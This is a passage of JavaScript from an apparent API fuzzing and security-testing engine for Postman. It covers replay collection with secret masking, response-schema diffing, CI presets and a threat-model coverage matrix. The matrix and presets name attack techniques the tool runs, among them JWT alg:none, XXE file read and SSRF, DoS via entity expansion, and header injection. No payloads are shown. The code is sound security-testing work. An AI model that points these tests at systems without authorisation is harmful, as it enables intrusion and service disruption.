        const masked = {};
        const patterns = SECURITY_CONFIG.sensitivePatterns || [];
        const mask = (SECURITY_CONFIG.maskChar || '*').repeat(SECURITY_CONFIG.maskLength || 8);
        
        for (const key in headers) {
            if (headers.hasOwnProperty(key)) {
                const keyLower = key.toLowerCase();
                const isSensitive = patterns.some(pattern => 
                    keyLower.includes(pattern.toLowerCase())
                );
                
                masked[key] = isSensitive ? mask : headers[key];
            }
        }
        
        return masked;
    },
    
    createReplayPayload: function(result, replayId, method, url, bodyData, bodyFormat, headers, SECURITY_CONFIG) {
        try {
            const maskedBody = this.maskSecrets(bodyData, SECURITY_CONFIG);
            const maskedHeaders = this.maskHeaders(headers, SECURITY_CONFIG);
            
            const replay = {
                replayId: replayId,
                
                metadata: {
                    label: result.label || 'unknown',
                    stage: this.detectStage(result.label),
                    timestamp: result.timestamp || Date.now(),
                    timestampISO: new Date(result.timestamp || Date.now()).toISOString()
                },
                
                request: {
                    method: method,
                    url: url,
                    bodyFormat: bodyFormat,
                    body: maskedBody,
                    headers: maskedHeaders
                },
                
                response: {
                    code: result.code,
                    responseTime: result.responseTime || 0,
                    errorClass: result.errorClass || null,
                    signature: result.signature || null
                },
                
                mutation: {
                    type: this.detectMutationType(result.label),
                    target: this.extractMutationTarget(result.label)
                }
            };
            
            return replay;
            
        } catch (error) {
            console.warn(`⚠️ Replay payload creation failed: ${error.message}`);
            return {
                replayId: replayId,
                error: error.message,
                metadata: { label: result.label }
            };
        }
    },
    
    detectStage: function(label) {
        if (!label) return 'unknown';
        
        if (label.startsWith('BASELINE')) return 'baseline';
        if (label.startsWith('FUZZ')) return 'fuzz';
        if (label.startsWith('DEL-S')) return 'singleDelete';
        if (label.startsWith('DEL-C')) return 'cumulativeDelete';
        if (label.startsWith('JWT')) return 'security-jwt';
        if (label.startsWith('PAGINATION')) return 'security-pagination';
        if (label.startsWith('HEADER')) return 'security-header';
        if (label.startsWith('GRAPHQL')) return 'security-graphql';
        if (label.startsWith('XXE')) return 'security-xxe';
        
        return 'unknown';
    },
    
    detectMutationType: function(label) {
        if (!label) return 'unknown';
        
        if (label.includes('FUZZ')) return 'value-mutation';
        if (label.includes('DEL-S')) return 'single-deletion';
        if (label.includes('DEL-C')) return 'cumulative-deletion';
        if (label.includes('query.')) return 'query-parameter';
        if (label.includes('JWT')) return 'jwt-attack';
        if (label.includes('PAGINATION')) return 'pagination-attack';
        if (label.includes('HEADER')) return 'header-injection';
        if (label.includes('GRAPHQL')) return 'graphql-attack';
        if (label.includes('XXE')) return 'xxe-attack';
        
        return 'unknown';
    },
    
    extractMutationTarget: function(label) {
        if (!label) return null;
        
        const colonIndex = label.indexOf(':');
        if (colonIndex === -1) return label;
        
        const afterColon = label.substring(colonIndex + 1);
        const equalIndex = afterColon.indexOf('=');
        
        if (equalIndex !== -1) {
            return afterColon.substring(0, equalIndex);
        }
        
        return afterColon;
    },
    
    replayStorage: [],
    
    collect: function(result, replayId, method, url, bodyData, bodyFormat, headers, SECURITY_CONFIG, CONFIG) {

        if (!CONFIG || !CONFIG.features || !CONFIG.features.replayMode) {
            return;
        }
        
        // Собираем только findings (4xx, 5xx, network errors)
        if (!result || (result.code >= 200 && result.code < 400)) {
            return;
        }
        
        try {
            const replay = this.createReplayPayload(
                result, replayId, method, url, bodyData, bodyFormat, headers, SECURITY_CONFIG
            );
            
            this.replayStorage.push(replay);
            
            // Memory protection
            const maxReplayStorage = 500; // configurable
            if (this.replayStorage.length > maxReplayStorage) {
                console.warn(`⚠️ Replay storage limit reached (${maxReplayStorage}), dropping oldest`);
                this.replayStorage.shift();
            }
            
        } catch (error) {
            console.warn(`⚠️ Replay collection failed: ${error.message}`);
        }
    },
    
    getAll: function() {
        return this.replayStorage;
    },
    
    getById: function(replayId) {
        return this.replayStorage.find(r => r.replayId === replayId);
    },
    
    clear: function() {
        this.replayStorage = [];
    },
    
    export: function(CONFIG) {
        if (!CONFIG || !CONFIG.features || !CONFIG.features.replayMode) {
            return;
        }
        
        try {
            console.log('\n🔄 REPLAY PAYLOADS');
            console.log('─'.repeat(60));
            console.log(`Total replay payloads: ${this.replayStorage.length}`);
            
            if (this.replayStorage.length > 0) {
                console.log('\nSample (first 3):');
                this.replayStorage.slice(0, 3).forEach((replay, index) => {
                    console.log(`\n${index + 1}. ${replay.replayId}`);
                    console.log(`   Stage: ${replay.metadata.stage}`);
                    console.log(`   Label: ${replay.metadata.label}`);
                    console.log(`   Code: ${replay.response.code}`);
                    console.log(`   Mutation: ${replay.mutation.type} → ${replay.mutation.target}`);
                });
                
                if (this.replayStorage.length > 3) {
                    console.log(`\n... +${this.replayStorage.length - 3} more replay payloads`);
                }
            }
            
            console.log('\n─'.repeat(60) + '\n');
        } catch (error) {
            console.warn(`⚠️ Replay export failed: ${error.message}`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ReplayMode };
}

console.log('✅ Module 12: Replay Mode - LOADED');

// ============================================================================
// ENGINE v24.1.0 - Module 13: Response Schema Diff
// ============================================================================

const ResponseSchemaDiff = {
    
    extractSchema: function(obj, path, depth, maxDepth) {
        path = path || [];
        depth = depth || 0;
        maxDepth = maxDepth || 50; // используем ENGINE limits
        
        const schema = {};
        
        if (depth > maxDepth) {
            console.warn(`⚠️ Schema extraction max depth (${maxDepth}) reached`);
            return schema;
        }
        
        // Примитивы
        if (obj === null) {
            schema[path.join('.')] = 'null';
            return schema;
        }
        
        if (typeof obj !== 'object') {
            schema[path.join('.')] = typeof obj;
            return schema;
        }
        
        // Массивы
        if (Array.isArray(obj)) {
            schema[path.join('.')] = 'array';
            
            if (obj.length > 0) {
                const samplePath = path.concat('[0]');
                const sampleSchema = this.extractSchema(obj[0], samplePath, depth + 1, maxDepth);
                Object.assign(schema, sampleSchema);
            }
            
            return schema;
        }
        
        schema[path.join('.') || '(root)'] = 'object';
        
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                const childPath = path.concat(key);
                const childSchema = this.extractSchema(obj[key], childPath, depth + 1, maxDepth);
                Object.assign(schema, childSchema);
            }
        }
        
        return schema;
    },
    
    compareSchemas: function(baselineSchema, mutatedSchema) {
        const added = [];
        const removed = [];
        const typeChanged = [];
        
        if (!baselineSchema || !mutatedSchema) {
            return { added, removed, typeChanged };
        }
        
        for (const path in mutatedSchema) {
            if (!baselineSchema.hasOwnProperty(path)) {
                added.push({
                    path: path,
                    type: mutatedSchema[path]
                });
            } else if (baselineSchema[path] !== mutatedSchema[path]) {
                typeChanged.push({
                    path: path,
                    baselineType: baselineSchema[path],
                    mutatedType: mutatedSchema[path]
                });
            }
        }
        
        for (const path in baselineSchema) {
            if (!mutatedSchema.hasOwnProperty(path)) {
                removed.push({
                    path: path,
                    type: baselineSchema[path]
                });
            }
        }
        
        return { added, removed, typeChanged };
    },
    
    analyzeResponse: function(responseBody, maxDepth) {
        try {
            // Только JSON
            if (!responseBody || typeof responseBody !== 'object') {
                return null;
            }
            
            return this.extractSchema(responseBody, [], 0, maxDepth);
            
        } catch (error) {
            console.warn(`⚠️ Schema extraction failed: ${error.message}`);
            return null;
        }
    },
    
    baselineSchemas: [],
    
    saveBaselineSchema: function(responseBody, maxDepth) {
        const schema = this.analyzeResponse(responseBody, maxDepth);
        
        if (schema) {
            this.baselineSchemas.push(schema);
        }
    },
    
    getBaselineSchema: function() {
        if (this.baselineSchemas.length === 0) {
            return null;
        }
        
        if (this.baselineSchemas.length === 1) {
            return this.baselineSchemas[0];
        }
        
        // Пересечение схем
        const intersection = {};
        const firstSchema = this.baselineSchemas[0];
        
        for (const path in firstSchema) {
            const allMatch = this.baselineSchemas.every(schema => 
                schema.hasOwnProperty(path) && schema[path] === firstSchema[path]
            );
            
            if (allMatch) {
                intersection[path] = firstSchema[path];
            }
        }
        
        return intersection;
    },
    
    schemaDiffs: [],
    
    compareWithBaseline: function(result, responseBody, maxDepth) {
        try {
            const baselineSchema = this.getBaselineSchema();
            
            if (!baselineSchema) {
                return null; // нет baseline для сравнения
            }
            
            const mutatedSchema = this.analyzeResponse(responseBody, maxDepth);
            
            if (!mutatedSchema) {
                return null; // не JSON или ошибка
            }
            
            const diff = this.compareSchemas(baselineSchema, mutatedSchema);
            
            // Сохраняем только если есть изменения
            if (diff.added.length > 0 || diff.removed.length > 0 || diff.typeChanged.length > 0) {
                this.schemaDiffs.push({
                    label: result.label,
                    code: result.code,
                    diff: diff,
                    timestamp: result.timestamp || Date.now()
                });
                
                return diff;
            }
            
            return null;
            
        } catch (error) {
            console.warn(`⚠️ Schema diff comparison failed: ${error.message}`);
            return null;
        }
    },
    
    getAllDiffs: function() {
        return this.schemaDiffs;
    },
    
    clear: function() {
        this.baselineSchemas = [];
        this.schemaDiffs = [];
    },
    
    getStats: function() {
        const totalDiffs = this.schemaDiffs.length;
        
        let totalAdded = 0;
        let totalRemoved = 0;
        let totalTypeChanged = 0;
        
        for (const diffResult of this.schemaDiffs) {
            totalAdded += diffResult.diff.added.length;
            totalRemoved += diffResult.diff.removed.length;
            totalTypeChanged += diffResult.diff.typeChanged.length;
        }
        
        return {
            totalDiffs: totalDiffs,
            totalAdded: totalAdded,
            totalRemoved: totalRemoved,
            totalTypeChanged: totalTypeChanged
        };
    },

    export: function(CONFIG) {
        if (!CONFIG || !CONFIG.features || !CONFIG.features.schemaDiff) {
            return;
        }
        
        try {
            const stats = this.getStats();
            
            console.log('\n📐 RESPONSE SCHEMA DIFF');
            console.log('─'.repeat(60));
            console.log(`Total schema changes detected: ${stats.totalDiffs}`);
            console.log(`  Added fields: ${stats.totalAdded}`);
            console.log(`  Removed fields: ${stats.totalRemoved}`);
            console.log(`  Type changes: ${stats.totalTypeChanged}`);
            
            if (this.schemaDiffs.length > 0) {
                console.log('\nTop 5 schema changes:');
                
                this.schemaDiffs.slice(0, 5).forEach((diffResult, index) => {
                    console.log(`\n${index + 1}. ${diffResult.label} [${diffResult.code}]`);
                    
                    if (diffResult.diff.added.length > 0) {
                        console.log(`   Added: ${diffResult.diff.added.map(a => a.path).join(', ')}`);
                    }
                    
                    if (diffResult.diff.removed.length > 0) {
                        console.log(`   Removed: ${diffResult.diff.removed.map(r => r.path).join(', ')}`);
                    }
                    
                    if (diffResult.diff.typeChanged.length > 0) {
                        diffResult.diff.typeChanged.forEach(tc => {
                            console.log(`   Type changed: ${tc.path} (${tc.baselineType} → ${tc.mutatedType})`);
                        });
                    }
                });
                
                if (this.schemaDiffs.length > 5) {
                    console.log(`\n... +${this.schemaDiffs.length - 5} more schema changes`);
                }
            }
            
            console.log('\n─'.repeat(60) + '\n');
        } catch (error) {
            console.warn(`⚠️ Schema diff export failed: ${error.message}`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ResponseSchemaDiff };
}

console.log('✅ Module 13: Response Schema Diff - LOADED');

// ============================================================================
// ENGINE v24.1.0 - Module 14: Execution Presets
// ============================================================================

const ExecutionPresets = {
    
    presets: {
        
        'ci-light': {
            description: 'Fast smoke test for CI pipelines',
            
            stages: {
                baseline: true,
                fuzz: true,
                singleDelete: false,
                cumulativeDelete: false
            },
            
            fuzzing: {
                usePolicies: ['light'],
                typeAwareness: true,
                fuzzObjects: false,
                fuzzArrays: false
            },
            
            delayMs: 100,
            globalTimeoutMs: 300000, // 5min
            
            features: {
                abortFast: true,
                postmanTest: true,
                telemetry: false,
                securityTests: false,
                jsonSummary: true,
                sarifReport: true,
                replayMode: false,
                schemaDiff: false
            },
            
            abortFast: {
                sameError: 3,
                serverCrash: 2,
                totalConsecutive: 5
            },
            
            logShowResponse: false,
            logDetailedSteps: false
        },
        
        'ci-full': {
            description: 'Complete security audit for CI',
            
            stages: {
                baseline: true,
                fuzz: true,
                singleDelete: true,
                cumulativeDelete: true
            },
            
            fuzzing: {
                usePolicies: ['light', 'heavy', 'security'],
                typeAwareness: true,
                fuzzObjects: true,
                fuzzArrays: true
            },
            
            delayMs: 500,
            globalTimeoutMs: 1800000, // 30min
            
            features: {
                abortFast: true,
                postmanTest: true,
                telemetry: false,
                securityTests: true,
                jsonSummary: true,
                sarifReport: true,
                replayMode: true,
                schemaDiff: true
            },
            
            abortFast: {
                sameError: 5,
                serverCrash: 3,
                totalConsecutive: 10
            },
            
            logShowResponse: true,
            logDetailedSteps: false,
            
            // Security configs
            jwtConfig: {
                enabled: true,
                testAlgorithmNone: true,
                testSignatureRemoval: true,
                testPayloadTampering: true,
                testExpiredToken: true
            },
            
            paginationConfig: {
                enabled: true
            },
            
            headerInjectionConfig: {
                enabled: true
            },
            
            graphqlConfig: {
                enabled: true,
                introspectionEnabled: true,
                testDeepNesting: true,
                testBatching: true
            },
            
            xmlConfig: {
                enabled: true,
                enableXXE: true,
                testFileRead: true,
                testSSRF: true,
                testDoS: true
            }
        },
        
        'local-debug': {
            description: 'Verbose debug mode for local development',
            
            stages: {
                baseline: true,
                fuzz: true,
                singleDelete: true,
                cumulativeDelete: false
            },
            
            fuzzing: {
                usePolicies: ['light'],
                typeAwareness: true,
                fuzzObjects: true,
                fuzzArrays: false
            },
            
            delayMs: 1000,
            globalTimeoutMs: 3600000, // 60min
            
            features: {
                abortFast: false,
                postmanTest: true,
                telemetry: false,
                securityTests: true,
                jsonSummary: true,
                sarifReport: false,
                replayMode: true,
                schemaDiff: true
            },
            
            logShowResponse: true,
            logDetailedSteps: true,
            logDumpJsonLogs: true,
            
            stage3Config: {
                maxCombinations: 10,
                startWithPairs: true,
                maxFieldsPerCombo: 3
            }
        }
    },
    
    applyPreset: function(CONFIG, presetName) {
        if (!presetName || !this.presets[presetName]) {
            console.warn(`⚠️ Unknown preset: ${presetName}, using default CONFIG`);
            return CONFIG;
        }
        
        const preset = this.presets[presetName];
        
        console.log(`\n🎨 Applying preset: ${presetName}`);
        console.log(`   Description: ${preset.description}\n`);
        
        try {
            // Deep merge
            const mergedConfig = this.deepMerge(CONFIG, preset);
            
            // Замораживаем merged config
            return this.deepFreeze(mergedConfig);
            
        } catch (error) {
            console.warn(`⚠️ Preset application failed: ${error.message}, using default CONFIG`);
            return CONFIG;
        }
    },
    
    deepMerge: function(base, override) {
        const result = {};
        
        // Копируем базу
        for (const key in base) {
            if (base.hasOwnProperty(key)) {
                result[key] = base[key];
            }
        }
        
        for (const key in override) {
            if (override.hasOwnProperty(key)) {
                const baseValue = result[key];
                const overrideValue = override[key];
                
                // Если оба объекты - рекурсивный merge
                if (this.isPlainObject(baseValue) && this.isPlainObject(overrideValue)) {
                    result[key] = this.deepMerge(baseValue, overrideValue);
                } else {
                    result[key] = overrideValue;
                }
            }
        }
        
        return result;
    },

    isPlainObject: function(obj) {
        return obj !== null && 
               typeof obj === 'object' && 
               !Array.isArray(obj) &&
               Object.prototype.toString.call(obj) === '[object Object]';
    },
    
    deepFreeze: function(obj) {
        if (obj === null || typeof obj !== 'object') {
            return obj;
        }
        
        Object.freeze(obj);
        
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                this.deepFreeze(obj[key]);
            }
        }
        
        return obj;
    },

    listPresets: function() {
        console.log('\n🎨 AVAILABLE PRESETS');
        console.log('─'.repeat(60));
        
        for (const name in this.presets) {
            if (this.presets.hasOwnProperty(name)) {
                const preset = this.presets[name];
                console.log(`\n${name}:`);
                console.log(`  ${preset.description}`);
                console.log(`  Stages: ${Object.entries(preset.stages).filter(([k, v]) => v).map(([k]) => k).join(', ')}`);
                console.log(`  Security: ${preset.features.securityTests ? 'enabled' : 'disabled'}`);
            }
        }
        
        console.log('\n─'.repeat(60) + '\n');
    },

    detectPresetFromEnv: function() {
        if (typeof process !== 'undefined' && process.env && process.env.ENGINE_PRESET) {
            const presetName = process.env.ENGINE_PRESET;
            console.log(`\n🌍 Detected ENGINE_PRESET from environment: ${presetName}`);
            return presetName;
        }
        
        return null;
    },

    detectPresetFromPostman: function() {
        if (typeof pm !== 'undefined' && pm.environment) {
            try {
                const presetName = pm.environment.get('ENGINE_PRESET');
                
                if (presetName) {
                    console.log(`\n🌍 Detected ENGINE_PRESET from Postman environment: ${presetName}`);
                    return presetName;
                }
            } catch (error) {
                // Ignore
            }
        }
        
        return null;
    },
    
    /**
     * Auto-detect preset
     */
    autoDetectPreset: function() {
        return this.detectPresetFromPostman() || this.detectPresetFromEnv();
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ExecutionPresets };
}

console.log('✅ Module 14: Execution Presets - LOADED');

// ============================================================================
// ENGINE v24.1.0 - Module 15: Threat Model Documentation
// ============================================================================

const ThreatModelDoc = {
    
    matrix: [
        // ==================== INPUT VALIDATION ====================
        {
            category: 'Input Validation',
            threat: 'Missing required fields',
            coverage: 'full',
            stage: 'Stage 2 (Single Delete)',
            notes: 'Deletes each field individually and checks for validation errors'
        },
        {
            category: 'Input Validation',
            threat: 'Invalid data types',
            coverage: 'full',
            stage: 'Stage 1 (Fuzzing)',
            notes: 'Type-aware mutations: null, empty string, wrong types, arrays, objects'
        },
        {
            category: 'Input Validation',
            threat: 'Boundary values',
            coverage: 'partial',
            stage: 'Stage 1 (Fuzzing)',
            notes: 'Tests: -1, 0, 1, large numbers, long strings (255+ chars). Does NOT test domain-specific boundaries'
        },
        {
            category: 'Input Validation',
            threat: 'SQL Injection',
            coverage: 'partial',
            stage: 'Stage 1 (Fuzzing)',
            notes: 'Generic string mutations may trigger SQL errors. Does NOT use SQLi-specific payloads'
        },
        {
            category: 'Input Validation',
            threat: 'NoSQL Injection',
            coverage: 'partial',
            stage: 'Stage 1 (Fuzzing)',
            notes: 'Object/array mutations may trigger NoSQL errors. Limited payload diversity'
        },
        {
            category: 'Input Validation',
            threat: 'Command Injection',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. No OS command payloads'
        },
        {
            category: 'Input Validation',
            threat: 'Path Traversal',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. No file path payloads'
        },
        
        // ==================== AUTHENTICATION & AUTHORIZATION ====================
        {
            category: 'Authentication',
            threat: 'JWT Algorithm None attack',
            coverage: 'full',
            stage: 'Security Tests (JWT)',
            notes: 'Tests alg:none header manipulation'
        },
        {
            category: 'Authentication',
            threat: 'JWT Signature removal',
            coverage: 'full',
            stage: 'Security Tests (JWT)',
            notes: 'Tests empty signature acceptance'
        },
        {
            category: 'Authentication',
            threat: 'JWT Payload tampering',
            coverage: 'full',
            stage: 'Security Tests (JWT)',
            notes: 'Tests claim manipulation (role, admin, user_id, etc.)'
        },
        {
            category: 'Authentication',
            threat: 'Expired token acceptance',
            coverage: 'full',
            stage: 'Security Tests (JWT)',
            notes: 'Tests expired exp claim'
        },
        {
            category: 'Authorization',
            threat: 'Missing authentication',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Does NOT remove auth headers'
        },
        {
            category: 'Authorization',
            threat: 'IDOR (resource access)',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Does NOT test cross-user resource access'
        },
        {
            category: 'Authorization',
            threat: 'Privilege escalation',
            coverage: 'partial',
            stage: 'Security Tests (Headers)',
            notes: 'Tests X-User-Role, X-Admin headers. Limited to header injection'
        },
        
        // ==================== BUSINESS LOGIC ====================
        {
            category: 'Business Logic',
            threat: 'Pagination abuse',
            coverage: 'full',
            stage: 'Security Tests (Pagination)',
            notes: 'Tests negative values, extreme limits, type confusion'
        },
        {
            category: 'Business Logic',
            threat: 'Rate limiting bypass',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. ENGINE has rate limiter but does NOT test target API rate limits'
        },
        {
            category: 'Business Logic',
            threat: 'Race conditions',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. No concurrent requests'
        },
        {
            category: 'Business Logic',
            threat: 'State machine violations',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. Single-request scope'
        },
        
        // ==================== DATA EXPOSURE ====================
        {
            category: 'Data Exposure',
            threat: 'Excessive data in responses',
            coverage: 'partial',
            stage: 'Schema Diff',
            notes: 'Detects unexpected fields appearing in responses. Manual review required'
        },
        {
            category: 'Data Exposure',
            threat: 'Error message disclosure',
            coverage: 'partial',
            stage: 'All stages',
            notes: 'Logs error responses. Manual review required for sensitive info leakage'
        },
        {
            category: 'Data Exposure',
            threat: 'Stack traces in errors',
            coverage: 'partial',
            stage: 'All stages',
            notes: 'Logs responses. Manual review required'
        },
        
        // ==================== INJECTION ATTACKS ====================
        {
            category: 'Injection',
            threat: 'XXE (XML External Entity)',
            coverage: 'full',
            stage: 'Security Tests (XML)',
            notes: 'Tests file read, SSRF, and DoS payloads'
        },
        {
            category: 'Injection',
            threat: 'GraphQL Introspection',
            coverage: 'full',
            stage: 'Security Tests (GraphQL)',
            notes: 'Tests schema exposure via introspection query'
        },
        {
            category: 'Injection',
            threat: 'GraphQL DoS (deep nesting)',
            coverage: 'full',
            stage: 'Security Tests (GraphQL)',
            notes: 'Tests nested queries beyond configured depth'
        },
        {
            category: 'Injection',
            threat: 'GraphQL Batching abuse',
            coverage: 'full',
            stage: 'Security Tests (GraphQL)',
            notes: 'Tests excessive batch queries'
        },
        {
            category: 'Injection',
            threat: 'XSS (Cross-Site Scripting)',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. API testing scope, no browser context'
        },
        
        // ==================== NETWORK & PROTOCOL ====================
        {
            category: 'Network',
            threat: 'HTTP Method Override',
            coverage: 'full',
            stage: 'Security Tests (Headers)',
            notes: 'Tests X-HTTP-Method-Override header'
        },
        {
            category: 'Network',
            threat: 'Host header injection',
            coverage: 'full',
            stage: 'Security Tests (Headers)',
            notes: 'Tests Host and X-Forwarded-Host manipulation'
        },
        {
            category: 'Network',
            threat: 'SSRF via headers',
            coverage: 'partial',
            stage: 'Security Tests (Headers)',
            notes: 'Tests X-Forwarded-For, X-Real-IP. Limited payload diversity'
        },
        {
            category: 'Network',
            threat: 'SSRF via XML',
            coverage: 'full',
            stage: 'Security Tests (XML)',
            notes: 'Tests internal network and metadata endpoints'
        },
        
        // ==================== DENIAL OF SERVICE ====================
        {
            category: 'DoS',
            threat: 'Large payloads',
            coverage: 'partial',
            stage: 'Stage 1 (Fuzzing)',
            notes: 'Tests strings up to 1024 chars. Does NOT test multi-MB payloads'
        },
        {
            category: 'DoS',
            threat: 'Deep object nesting',
            coverage: 'partial',
            stage: 'All stages',
            notes: 'Limited by maxCollectDepth (50). Does NOT intentionally test extreme depths'
        },
        {
            category: 'DoS',
            threat: 'Regex DoS (ReDoS)',
            coverage: 'none',
            stage: 'N/A',
            notes: 'Not tested. No regex-specific payloads'
        },
        {
            category: 'DoS',
            threat: 'XML Billion Laughs',
            coverage: 'full',
            stage: 'Security Tests (XML)',
            notes: 'Tests exponential entity expansion'
        }
    ],
    
    generateMarkdown: function() {
        let md = '# ENGINE v24.1.0 - Threat Model Coverage\n\n';
        
        md += '## Overview\n\n';
        md += 'This document explains what ENGINE tests and what it does NOT test.\n';
        md += 'Use this to understand security coverage and plan complementary testing.\n\n';
        
        md += '## Coverage Legend\n\n';
        md += '- **Full**: Comprehensive testing with specific payloads\n';
        md += '- **Partial**: Limited testing, may miss edge cases\n';
        md += '- **None**: Not tested by ENGINE\n\n';
        
        const categories = {};
        for (const item of this.matrix) {
            if (!categories[item.category]) {
                categories[item.category] = [];
            }
            categories[item.category].push(item);
        }
        
        for (const category in categories) {
            md += `## ${category}\n\n`;
            md += '| Threat | Coverage | Stage | Notes |\n';
            md += '|--------|----------|-------|-------|\n';
            
            for (const item of categories[category]) {
                const coverage = item.coverage === 'full' ? '✅ Full' :
                                item.coverage === 'partial' ? '⚠️ Partial' :
                                '❌ None';
                
                md += `| ${item.threat} | ${coverage} | ${item.stage} | ${item.notes} |\n`;
            }
            
            md += '\n';
        }
        
        // Статистика
        const fullCount = this.matrix.filter(i => i.coverage === 'full').length;
        const partialCount = this.matrix.filter(i => i.coverage === 'partial').length;
        const noneCount = this.matrix.filter(i => i.coverage === 'none').length;
        const totalCount = this.matrix.length;
        
        md += '## Coverage Summary\n\n';
        md += '```\n';
        md += `Total threats documented: ${totalCount}\n`;
        md += `✅ Full coverage:        ${fullCount} (${((fullCount / totalCount) * 100).toFixed(1)}%)\n`;
        md += `⚠️ Partial coverage:     ${partialCount} (${((partialCount / totalCount) * 100).toFixed(1)}%)\n`;
        md += `❌ Not tested:           ${noneCount} (${((noneCount / totalCount) * 100).toFixed(1)}%)\n`;
        md += '```\n\n';
        
        md += '## Recommendations\n\n';
        md += '### What ENGINE does well\n';
        md += '- Input validation (type confusion, missing fields)\n';
        md += '- JWT security testing\n';
        md += '- XXE and GraphQL vulnerabilities\n';
        md += '- Header injection attacks\n';
        md += '- Pagination abuse\n\n';
        
        md += '### What requires additional testing\n';
        md += '- **IDOR and privilege escalation**: Use dedicated authz testing tools\n';
        md += '- **Business logic flaws**: Requires domain knowledge and manual testing\n';
        md += '- **Race conditions**: Use concurrent request tools\n';
        md += '- **Sensitive data exposure**: Manual review of responses\n';
        md += '- **SQL/NoSQL injection**: Use specialized fuzzing tools (SQLMap, etc.)\n\n';
        
        md += '---\n';
        md += `Generated: ${new Date().toISOString()}\n`;
        
        return md;
    },
    
    export: function(CONFIG) {
        if (!CONFIG || !CONFIG.features || !CONFIG.features.threatModelDoc) {
            return;
        }
        
        try {
            console.log('\n📋 THREAT MODEL DOCUMENTATION');
            console.log('─'.repeat(60));
            
            const fullCount = this.matrix.filter(i => i.coverage === 'full').length;
            const partialCount = this.matrix.filter(i => i.coverage === 'partial').length;
            const noneCount = this.matrix.filter(i => i.coverage === 'none').length;
            const totalCount = this.matrix.length;
            
            console.log(`\nCoverage Summary:`);
            console.log(`  Total threats: ${totalCount}`);
            console.log(`  ✅ Full:       ${fullCount} (${((fullCount / totalCount) * 100).toFixed(1)}%)`);
            console.log(`  ⚠️ Partial:    ${partialCount} (${((partialCount / totalCount) * 100).toFixed(1)}%)`);
            console.log(`  ❌ None:       ${noneCount} (${((noneCount / totalCount) * 100).toFixed(1)}%)`);
            
            console.log('\n─'.repeat(60) + '\n');
            
            console.log('💡 Tip: Full threat model available in Markdown format');
            console.log('   Call ThreatModelDoc.generateMarkdown() to export\n');
            
        } catch (error) {
            console.warn(`⚠️ Threat model doc export failed: ${error.message}`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ThreatModelDoc };
}

console.log('✅ Module 15: Threat Model Documentation - LOADED');


// ============================================================================
// ENGINE v24.1.0 - Module 15: Main Entry Point (ORCHESTRATOR)
// ============================================================================

(async function main() {
    try {
        // 1. Config with Presets
        let activeConfig = CONFIG;
        
        if (typeof ExecutionPresets !== 'undefined') {
            const detectedPreset = ExecutionPresets.autoDetectPreset();
            if (detectedPreset) {
                activeConfig = ExecutionPresets.applyPreset(CONFIG, detectedPreset);
            }
        }

        let stats = createFreshStats();
        
        console.log('\n╔═══════════════════════════════════════════════════════════╗');
        console.log(`║          ENGINE ${ENGINE_VERSION} STARTING          ║`);
        console.log('╚═══════════════════════════════════════════════════════════╝');
        
        console.log(`\nRuntime: ${RUNTIME.isNewman ? 'Newman' : 'Postman UI'}`);
        console.log(`Memory Limits: depth=${MEMORY_LIMITS.maxCollectDepth}, nodes=${MEMORY_LIMITS.maxCollectNodesSize}`);
        console.log(`Security Tests: ${activeConfig.features.securityTests ? 'ENABLED' : 'DISABLED'}\n`);
        
        // 2. Data Preparation
        const { method, url } = PostmanAdapter.extractMethodAndUrl();
        console.log(`📋 Method: ${method}`);
        console.log(`🔗 URL: ${url}`);
        
        const { format: bodyFormat, data: bodyData } = detectBodyFormat(Utils);
        if (!bodyData) throw new Error('No request body found');
        
        stats.bodyFormat = bodyFormat;
        console.log(`📄 Body format: ${bodyFormat.toUpperCase()}\n`);
        
        const provider = DataProviderFactory.create(bodyFormat);
        validateRequiredVariables(bodyData, bodyFormat, activeConfig, TemplateProcessor);
        
        // 3. Node Collection
        let allNodes = [];
        let templateOriginal = bodyData;
        
        if (bodyFormat === 'json') {
            allNodes = provider.collectNodes(templateOriginal, [], '', 0, new WeakSet(), MEMORY_LIMITS);
            const primitives = allNodes.filter(n => n.valueType === 'primitive' && n.path.length > 0);
            const objects = allNodes.filter(n => n.valueType === 'object' && n.path.length > 0);
            const arrays = allNodes.filter(n => n.valueType === 'array' && n.path.length > 0);
            console.log(`🌳 Total nodes: ${allNodes.length}`);
            console.log(`   Primitives: ${primitives.length} | Objects: ${objects.length} | Arrays: ${arrays.length}\n`);
        } else if (bodyFormat === 'formdata') {
            allNodes = provider.collectNodes(templateOriginal);
            const textFields = allNodes.filter(n => n.formDataType === 'text');
            const fileFields = allNodes.filter(n => n.formDataType === 'file');
            console.log(`🌳 Form fields: ${textFields.length} text, ${fileFields.length} files\n`);
            stats.formatStats.formDataFields = textFields.length;
            stats.formatStats.formDataFiles = fileFields.length;
        } else if (bodyFormat === 'urlencoded') {
            allNodes = provider.collectNodes(templateOriginal);
            console.log(`🌳 URL-encoded fields: ${allNodes.length}\n`);
            stats.formatStats.urlencodedFields = allNodes.length;
        } else if (bodyFormat === 'graphql') {
            allNodes = provider.collectNodes(templateOriginal);
            const varNodes = allNodes.filter(n => n.path[0] === 'variables' && n.valueType === 'primitive');
            console.log(`🌳 GraphQL variables: ${varNodes.length}\n`);
            stats.formatStats.graphqlVariables = varNodes.length;
        }
        
        // 4. HTTP Infrastructure
        const rateLimiter = createRateLimiter(activeConfig);
        const httpClient = createHttpClient(activeConfig);
        const allStagesResults = [];
        
        // 5. STAGE 0: Baseline
        const baselineOk = await MutationStages.executeBaseline(
            method, url, templateOriginal, bodyFormat, activeConfig, Utils, 
            TemplateProcessor, httpClient, rateLimiter, stats, ResponseAnalyzer
        );
        
        // Save baseline schemas
        if (activeConfig.features && activeConfig.features.schemaDiff && baselineOk && typeof ResponseSchemaDiff !== 'undefined') {
